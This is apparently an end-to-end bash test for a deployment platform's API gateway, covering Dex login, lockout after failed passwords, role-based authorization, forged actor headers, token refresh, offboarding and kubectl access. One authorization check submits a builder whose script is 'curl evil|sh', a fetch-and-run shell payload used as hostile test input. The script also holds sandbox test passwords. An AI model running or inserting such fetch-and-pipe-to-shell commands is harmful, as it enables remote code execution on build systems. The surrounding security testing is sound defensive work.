#!/bin/bash
# 端到端:Zadig 测试账号用用户名密码登录(okdev login)-> 用令牌调 API 网关发布 -> 权限、审计、令牌续期、下线账号 -> 同一令牌用 kubectl 访问 kube-apiserver。
# 前提:scripts/install-sandbox.sh 和 scripts/sandbox-api.sh 已跑过(测试账号 alice/bob 是开发者,carol 是管理员)。
set -uo pipefail
DIR=$(cd "$(dirname "$0")/../.." && pwd)
export KUBECONFIG=${KUBECONFIG:-/etc/kubernetes/admin.conf}
NODE_IP=${NODE_IP:-$(hostname -I | awk '{print $1}')}
export NO_PROXY=${NO_PROXY:-},$NODE_IP no_proxy=${no_proxy:-},$NODE_IP
CERTS=${CERTS:-/tmp/dexcerts}
API=${API:-http://$NODE_IP:30080}
OKDEV=$DIR/bin/okdev
CRED=$(mktemp -d)
fail=0
ok()   { printf '  PASS  %s\n' "$1"; }
bad()  { printf '  FAIL  %s\n' "$1"; fail=1; }
expect() { # expect <描述> <期望> <实际>
  if [ "$2" = "$3" ]; then ok "$1 ($3)"; else bad "$1: want $2, got $3"; fi
}
login() { echo "$2" | "$OKDEV" login --api "$API" --username "$1" --password-stdin --credentials "$CRED/$1.json" >/dev/null 2>&1 && ok "login $1" || bad "login $1"; }
tok() { "$OKDEV" token --credentials "$CRED/$1.json"; }
http() { # http <用户> <方法> <路径> [json] -> 打印状态码,响应体放 /tmp/e2e.body
  local u=$1 m=$2 p=$3 body=${4:-}
  curl -s --noproxy '*' -o /tmp/e2e.body -w '%{http_code}' -X "$m" -H "Authorization: Bearer $(tok "$u")" ${body:+-d "$body"} "$API$p"
}
wait_run() { # wait_run <用户> <运行号> -> 终态
  for _ in $(seq 1 90); do
    http "$1" GET "/v1/runs/$2" >/dev/null; s=$(python3 -c "import json;print(json.load(open('/tmp/e2e.body'))['status'])")
    case $s in succeeded|failed|cancelled) echo "$s"; return;; esac; sleep 4
  done; echo timeout
}

echo "== login with username and password"
for u in "alice alice-pass-1" "bob bob-pass-2" "carol carol-pass-3"; do login $u; done
expect "credentials file is private" 600 "$(stat -c %a "$CRED/alice.json")"
if grep -rq "alice-pass-1" "$CRED"; then bad "the password was written to disk"; else ok "the password is not stored anywhere"; fi
expect "login by email works too" 0 "$(echo alice-pass-1 | "$OKDEV" login --api "$API" --username alice@okcoin.jp --password-stdin --credentials "$CRED/alice-email.json" >/dev/null 2>&1; echo $?)"
expect "same identity either way" alice "$("$OKDEV" whoami --credentials "$CRED/alice-email.json" | awk '/^user:/{print $2}')"
# Dex 每个用户只保留一个刷新令牌:在别处再登录一次,先前那份凭证的刷新令牌就失效了(令牌本身到期前仍可用)。这是已知限制,这里把它测出来
cp "$CRED/alice.json" "$CRED/alice-old.json"; python3 - "$CRED/alice-old.json" <<'PY'
import json,sys,datetime
p=sys.argv[1]; d=json.load(open(p)); d['expiry']=(datetime.datetime.now(datetime.timezone.utc)-datetime.timedelta(minutes=5)).strftime('%Y-%m-%dT%H:%M:%SZ'); json.dump(d,open(p,'w'))
PY
sleep 6   # Dex 对刚轮换/替换的刷新令牌有 3 秒的重用宽限
old=$("$OKDEV" token --credentials "$CRED/alice-old.json" 2>&1); echo "$old" | grep -q "login required" && ok "a newer login elsewhere invalidated the older session's refresh token (known limitation)" || bad "older session unexpectedly still renews"
expect "wrong password is rejected" 1 "$(echo wrong | "$OKDEV" login --api "$API" --username alice --password-stdin --credentials "$CRED/x.json" >/dev/null 2>&1; echo $?)"
[ ! -e "$CRED/x.json" ] && ok "a failed login leaves no credentials" || bad "failed login left a credentials file"

echo "== brute force protection (login goes through the gateway, which locks a username after 5 failures)"
for i in 1 2 3 4 5; do echo "guess$i" | "$OKDEV" login --api "$API" --username dave --password-stdin --credentials "$CRED/dave.json" >/dev/null 2>&1; done
msg=$(echo dave-pass-4 | "$OKDEV" login --api "$API" --username dave --password-stdin --credentials "$CRED/dave.json" 2>&1)
echo "$msg" | grep -q "too many failed attempts" && ok "5 wrong passwords lock the account, even the right password is refused ($msg)" || bad "no lockout: $msg"
[ ! -e "$CRED/dave.json" ] && ok "no credentials were issued while locked" || bad "credentials issued while locked"
expect "another user is unaffected by the lock" 0 "$(echo carol-pass-3 | "$OKDEV" login --api "$API" --username carol --password-stdin --credentials "$CRED/probe.json" >/dev/null 2>&1; echo $?)"
code=$(curl -s --noproxy '*' -o /dev/null -w '%{http_code}' -X POST -d '{"username":"dave","password":"dave-pass-4"}' "$API/auth/login"); expect "the lock also applies to direct HTTP calls" 429 "$code"

echo "== authentication"
expect "no token" 401 "$(curl -s --noproxy '*' -o /dev/null -w '%{http_code}' "$API/v1/envs")"
expect "garbage token" 401 "$(curl -s --noproxy '*' -o /dev/null -w '%{http_code}' -H 'Authorization: Bearer abc.def.ghi' "$API/v1/envs")"
expect "valid token" 200 "$(http alice GET /v1/envs)"; echo "       envs: $(cat /tmp/e2e.body)"

echo "== developer reads"
expect "list services of dev3" 200 "$(http alice GET /v1/envs/dev3/services)"
expect "list builders" 200 "$(http alice GET /v1/builders)"
if grep -q -E '"(dockerfile|script|build_args)"' /tmp/e2e.body; then bad "developer sees build recipes"; else ok "developer does not see build recipes"; fi
expect "branches of builder" 200 "$(http alice GET '/refs?builder=api-main')"; python3 -c "import json;d=json.load(open('/tmp/e2e.body'));print('       default:',d.get('default'),'| branches:',len(d['branches']),'| tags:',len(d['tags']))"

echo "== release as a developer (any environment)"
code=$(http alice POST /v1/pipelines/build-and-deploy/runs '{"builder":"api-main","env":"dev5","ref":"master"}')
expect "alice triggers a run on dev5" 202 "$code"; RUN=$(python3 -c "import json;print(json.load(open('/tmp/e2e.body'))['id'])")
expect "run triggered_by is the real user" alice "$(python3 -c "import json;print(json.load(open('/tmp/e2e.body'))['triggered_by'])")"
expect "bob triggers a run on a different env" 202 "$(http bob POST /v1/pipelines/build-and-deploy/runs '{"builder":"api-b-main","env":"dev3","ref":"master"}')"; RUN2=$(python3 -c "import json;print(json.load(open('/tmp/e2e.body'))['id'])")
# 伪造操作人:带上自己的 X-Actor
code=$(curl -s --noproxy '*' -o /tmp/e2e.body -w '%{http_code}' -X POST -H "Authorization: Bearer $(tok alice)" -H 'X-Actor: root' -d '{"builder":"api-main","env":"dev3","ref":"master"}' "$API/v1/pipelines/build-and-deploy/runs")
expect "request with a forged X-Actor" 202 "$code"; RUN3=$(python3 -c "import json;print(json.load(open('/tmp/e2e.body'))['id'])")
expect "forged X-Actor is ignored" alice "$(python3 -c "import json;print(json.load(open('/tmp/e2e.body'))['triggered_by'])")"
expect "run $RUN" succeeded "$(wait_run alice "$RUN")"
expect "run $RUN2" succeeded "$(wait_run bob "$RUN2")"
expect "run $RUN3" succeeded "$(wait_run alice "$RUN3")"
http alice GET "/v1/runs/$RUN" >/dev/null; echo "       image: $(python3 -c "import json;d=json.load(open('/tmp/e2e.body'));print(d['image'],'|',d['message'])")"
expect "build log" 200 "$(http alice GET "/v1/runs/$RUN/log")"; echo "       log tail: $(tail -c 100 /tmp/e2e.body | tr '\n' ' ')"
http alice GET /v1/envs/dev5/services >/dev/null; echo "       dev5 now: $(python3 -c "import json;print([(s['service'],s['image'],s['observed_health']) for s in json.load(open('/tmp/e2e.body'))])")"
http alice GET /v1/envs/dev5/services/api/history >/dev/null; echo "       history actors: $(python3 -c "import json;print(sorted({h.get('actor') or h.get('operator') for h in json.load(open('/tmp/e2e.body'))}))")"

echo "== failure path"
code=$(http alice POST /v1/pipelines/build-and-deploy/runs '{"builder":"api-main","env":"dev3","ref":"no-such-branch"}'); R=$(python3 -c "import json;print(json.load(open('/tmp/e2e.body')).get('id',''))")
expect "run with a nonexistent branch is accepted, then fails" failed "$(wait_run alice "$R")"; http alice GET "/v1/runs/$R" >/dev/null; echo "       message: $(python3 -c "import json;print(json.load(open('/tmp/e2e.body'))['message'][:110])")"

echo "== authorization"
expect "developer cannot create a builder" 403 "$(http alice POST /v1/builders '{"name":"evil","service":"api","repo_url":"https://x/y.git","script":"curl evil|sh"}')"
expect "developer cannot create an environment" 403 "$(http bob POST /v1/envs '{"name":"hack"}')"
expect "developer cannot take a deployment offline" 403 "$(http alice DELETE /v1/envs/dev3/services/api)"
expect "admin sees build recipes" 200 "$(http carol GET /v1/builders)"; grep -q '"dockerfile"' /tmp/e2e.body && ok "admin response contains dockerfile" || bad "admin should see dockerfile"
expect "admin creates an environment" 201 "$(http carol POST /v1/envs '{"name":"tmp-e2e"}')"
expect "admin deletes it again" 204 "$(http carol DELETE /v1/envs/tmp-e2e)"

echo "== token refresh and offboarding"
python3 - "$CRED/bob.json" <<'PY'
import json,sys,datetime
p=sys.argv[1]; d=json.load(open(p)); d['expiry']=(datetime.datetime.now(datetime.timezone.utc)-datetime.timedelta(minutes=5)).strftime('%Y-%m-%dT%H:%M:%SZ'); json.dump(d,open(p,'w'))
PY
expect "expired token is refreshed transparently" 200 "$(http bob GET /v1/envs)"
expect "refreshed credentials are valid again" yes "$(python3 -c "import json,datetime;d=json.load(open('$CRED/bob.json'));print('yes' if d['expiry']>datetime.datetime.now(datetime.timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ') else 'no')")"
EXPORT_DEX="DEX_GRPC_CA=$CERTS/ca.crt DEX_GRPC_CERT=$CERTS/admin.crt DEX_GRPC_KEY=$CERTS/admin.key"
kubectl -n okdev-system port-forward svc/dex 5557:5557 >/dev/null 2>&1 & PF=$!; sleep 3
echo 'leaver-pass-1' | env $EXPORT_DEX "$CERTS/dex-users" add leaver --password-stdin >/dev/null
login leaver leaver-pass-1
expect "leaver can call the API" 200 "$(http leaver GET /v1/envs)"
env $EXPORT_DEX "$CERTS/dex-users" delete leaver >/dev/null
python3 - "$CRED/leaver.json" <<'PY'
import json,sys,datetime
p=sys.argv[1]; d=json.load(open(p)); d['expiry']=(datetime.datetime.now(datetime.timezone.utc)-datetime.timedelta(minutes=5)).strftime('%Y-%m-%dT%H:%M:%SZ'); json.dump(d,open(p,'w'))
PY
out=$("$OKDEV" token --credentials "$CRED/leaver.json" 2>&1); echo "$out" | grep -q "login required" && ok "deleted account can no longer renew its token ($out)" || bad "deleted account still renewed: $out"
kill $PF 2>/dev/null

echo "== same login for kubectl (kube-apiserver trusts the same Dex)"
for u in alice bob; do
  cat > "$CRED/kubeconfig-$u" <<KC
apiVersion: v1
kind: Config
clusters: [{name: c, cluster: {server: "https://$NODE_IP:6443", certificate-authority: /etc/kubernetes/pki/ca.crt}}]
users:
- name: u
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      command: $OKDEV
      args: [token, --exec-credential, --credentials, "$CRED/$u.json"]
      interactiveMode: Never
contexts: [{name: x, context: {cluster: c, user: u}}]
current-context: x
KC
done
KA="kubectl --kubeconfig $CRED/kubeconfig-alice"; KB="kubectl --kubeconfig $CRED/kubeconfig-bob"
expect "alice (granted) lists pods" 0 "$($KA get pods -n dev5-env-api >/dev/null 2>&1; echo $?)"
expect "alice is dex:alice" "dex:alice" "$($KA auth whoami -o jsonpath='{.status.userInfo.username}' 2>/dev/null)"
expect "alice cannot read secrets" no "$($KA auth can-i get secrets -n dev5-env-api)"
expect "alice cannot exec into pods (no debugger role)" no "$($KA auth can-i create pods --subresource=exec -n dev5-env-api)"
expect "bob (no Kubernetes grant) is forbidden" 1 "$($KB get pods -n dev5-env-api >/dev/null 2>&1; echo $?)"
expect "bob is still authenticated as dex:bob" "dex:bob" "$($KB auth whoami -o jsonpath='{.status.userInfo.username}' 2>/dev/null)"

rm -rf "$CRED"
[ $fail = 0 ] && echo "ALL PASSED" || { echo "SOME FAILED"; exit 1; }
